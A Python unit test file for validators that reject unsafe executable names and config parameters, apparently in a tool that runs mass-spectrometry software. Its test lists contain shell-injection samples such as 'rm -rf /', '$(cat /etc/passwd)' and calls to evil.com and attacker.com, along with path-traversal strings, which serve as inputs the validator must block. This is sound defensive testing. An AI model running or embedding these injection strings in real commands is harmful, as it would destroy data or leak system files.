"""Unit tests for shared validation functions."""

from shared.validation import (
    EXECUTABLE_ABSOLUTE_PATH_ERROR,
    EXECUTABLE_EMPTY_ERROR,
    EXECUTABLE_INVALID_CHARS_ERROR,
    EXECUTABLE_PARENT_DIR_ERROR,
    SHELL_METACHARACTERS,
    validate_config_params,
    validate_name,
)


class TestValidateName:
    """Test cases for validate_name function."""

    def test_valid_executable_names(self) -> None:
        """Test that valid executable names pass validation."""
        valid_names_no_spaces = [
            "valid-executable",
            "executable.1.2.3",
            "sub/folder/executable",
            "deep/nested/path/executable",
            "exe_with_underscores",
            "exe-with-hyphens",
            "exe.with.dots",
            "123numeric",
            "a",
            "a/b",
        ]

        for name in valid_names_no_spaces:
            errors = validate_name(name)
            assert not errors, f"Expected '{name}' to be valid, got errors: {errors}"

    def test_valid_executable_names_with_spaces(self) -> None:
        """Test that valid executable names with spaces pass validation when allow_spaces=True."""
        valid_names_with_spaces = [
            "exe with spaces",
        ]

        for name in valid_names_with_spaces:
            errors = validate_name(name, allow_spaces=True)
            assert not errors, (
                f"Expected '{name}' to be valid with spaces allowed, got errors: {errors}"
            )

    def test_empty_executable_name(self) -> None:
        """Test that empty executable name fails validation."""
        errors = validate_name("")
        assert errors == [EXECUTABLE_EMPTY_ERROR]

    def test_parent_directory_references(self) -> None:
        """Test that parent directory references fail validation."""
        invalid_names = [
            "../executable",
            "folder/../executable",
            "../../../bin/bash",
            "exe..cutable",
            "..executable",
            "executable..",
        ]

        for name in invalid_names:
            errors = validate_name(name)
            assert errors, f"Expected '{name}' to be invalid"
            assert EXECUTABLE_PARENT_DIR_ERROR in errors

    def test_absolute_paths(self) -> None:
        """Test that absolute paths fail validation."""
        invalid_names = [
            "/usr/bin/bash",
            "/bin/sh",
            "/executable",
            "/path/to/executable",
        ]

        for name in invalid_names:
            errors = validate_name(name)
            assert errors, f"Expected '{name}' to be invalid"
            assert EXECUTABLE_ABSOLUTE_PATH_ERROR in errors

    def test_invalid_characters(self) -> None:
        """Test that invalid characters fail validation."""
        invalid_names = [
            "exe;rm",
            "exe&malicious",
            "exe|cmd",
            "exe$var",
            "exe`cmd`",
            "exe(cmd)",
            "exe<file",
            "exe>file",
            "exe*glob",
            "exe?query",
            "exe[array]",
            "exe{block}",
            "exe~home",
            "exe!bang",
            "exe\\backslash",
            'exe"quote',
            "exe'quote",
            "exe\ttab",
            "exe\nnewline",
        ]

        for name in invalid_names:
            errors = validate_name(name)
            assert errors, f"Expected '{name}' to be invalid"
            assert EXECUTABLE_INVALID_CHARS_ERROR in errors


class TestValidateConfigParams:
    """Test cases for validate_config_params function."""

    def test_valid_config_params(self) -> None:
        """Test that valid config parameters pass validation."""
        valid_params = [
            "--input file.raw --output dir",
            "--qvalue 0.01 --f RAW_FILE_PATH --out OUTPUT_PATH",
            "--lib LIBRARY_PATH --fasta FASTA_PATH",
            "--verbose --threads 8",
            "/path/to/file.raw",
            "--param=value",
            "--param value with spaces",
            "--option1 --option2",
            "",  # Empty params should be allowed
        ]

        for params in valid_params:
            errors = validate_config_params(params)
            assert not errors, f"Expected '{params}' to be valid, got errors: {errors}"

    def test_empty_config_params(self) -> None:
        """Test that empty config params are allowed."""
        errors = validate_config_params("")
        assert not errors

    def test_shell_metacharacters(self) -> None:
        """Test that shell metacharacters fail validation."""
        # Test each forbidden character individually
        for char in SHELL_METACHARACTERS:
            invalid_param = f"--option{char}value"
            errors = validate_config_params(invalid_param)
            assert errors, f"Expected parameter with '{char}' to be invalid"
            assert "forbidden shell metacharacters" in errors[0]
            assert char in errors[0]

    def test_multiple_shell_metacharacters(self) -> None:
        """Test that multiple shell metacharacters are all reported."""
        invalid_param = "--input file.raw; rm -rf / && curl evil.com"
        errors = validate_config_params(invalid_param)
        assert errors
        assert "forbidden shell metacharacters" in errors[0]
        # Should contain the forbidden characters found
        assert ";" in errors[0]
        assert "&" in errors[0]

    def test_common_injection_attempts(self) -> None:
        """Test common command injection patterns."""
        injection_attempts = [
            "--input file.raw; rm -rf /",
            "--output $(cat /etc/passwd)",
            "--param `curl evil.com`",
            "--input file.raw && malicious_command",
            "--output dir | curl attacker.com",
            "--param value; shutdown -h now",
            "--input 'file.raw'",  # Single quotes
            '--output "dir"',  # Double quotes
            "--param value\\escape",
            "--input file.raw > /dev/null",
            "--param $(malicious)",
            "--input file.raw < /etc/hosts",
            "--param [dangerous]",
            "--input {dangerous}",
            "--param ~user/file",
            "--input file.raw!",
            "--param value*",
            "--input file?.raw",
            "; ./my_exe",
        ]

        for attempt in injection_attempts:
            errors = validate_config_params(attempt)
            assert errors, f"Expected injection attempt '{attempt}' to be blocked"
            assert "forbidden shell metacharacters" in errors[0]
